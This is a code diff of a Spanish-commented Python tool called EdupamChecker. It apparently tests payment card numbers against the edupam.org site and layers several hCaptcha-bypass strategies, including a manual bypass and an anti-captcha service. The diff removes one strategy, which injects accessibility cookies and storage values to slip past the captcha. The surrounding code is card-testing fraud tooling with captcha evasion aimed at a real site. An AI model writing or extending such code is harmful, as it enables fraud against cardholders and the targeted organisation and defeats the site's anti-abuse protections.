@@ -842,19 +842,6 @@ class EdupamChecker:
                 logger.info("✅ ¡Bypass manual exitoso!")
                 return True
             
-            # ========== ESTRATEGIA 2: MODO ACCESIBILIDAD ==========
-            logger.info("🔄 Intentando modo accesibilidad...")
-            if self.enable_hcaptcha_accessibility(page):
-                logger.info("✅ Modo accesibilidad activado, recargando...")
-                page.reload()
-                time.sleep(4)
-                
-                # Verificar si el captcha desapareció
-                page_content = page.content().lower()
-                if 'accessibility cookie is set' in page_content or '❌' not in page_content:
-                    logger.info("✅ Captcha bypassed con cookie de accesibilidad")
-                    return True
-            
             # ========== ESTRATEGIA 3: ANTI-CAPTCHA (PRINCIPAL) ==========
             if not site_key:
                 logger.error(f"❌ No se pudo extraer site-key para ****{card_last4}")
@@ -1022,37 +1009,6 @@ class EdupamChecker:
             logger.error(f"❌ Error crítico en solve_captcha_if_present: {e}")
             return False
         
-    def enable_hcaptcha_accessibility(self, page):
-        """Activar modo accesibilidad de hCaptcha"""
-        try:
-            logger.info("🔄 Activando modo accesibilidad hCaptcha...")
-            
-            # Establecer cookie de accesibilidad
-            page.evaluate("""
-                () => {
-                    // Cookie de accesibilidad hCaptcha
-                    document.cookie = "hc_accessibility=1; domain=.hcaptcha.com; path=/; secure";
-                    document.cookie = "hc_accessibility=1; domain=hcaptcha.com; path=/; secure";
-                    document.cookie = "hc_accessibility=1; domain=.edupam.org; path=/; secure";
-                    
-                    // También establecer en localStorage
-                    try {
-                        localStorage.setItem('hc_accessibility', '1');
-                        sessionStorage.setItem('hc_accessibility', '1');
-                    } catch(e) {}
-                    
-                    console.log('🎯 Cookie de accesibilidad establecida');
-                    return true;
-                }
-            """)
-            
-            time.sleep(2)
-            return True
-            
-        except Exception as e:
-            logger.error(f"❌ Error activando accesibilidad: {e}")
-            return False
-
     def check_single_card(self, card_string, amount=50):
         """Verificar una sola tarjeta"""
         card_last4 = card_string.split('|')[0][-4:] if '|' in card_string else '????'
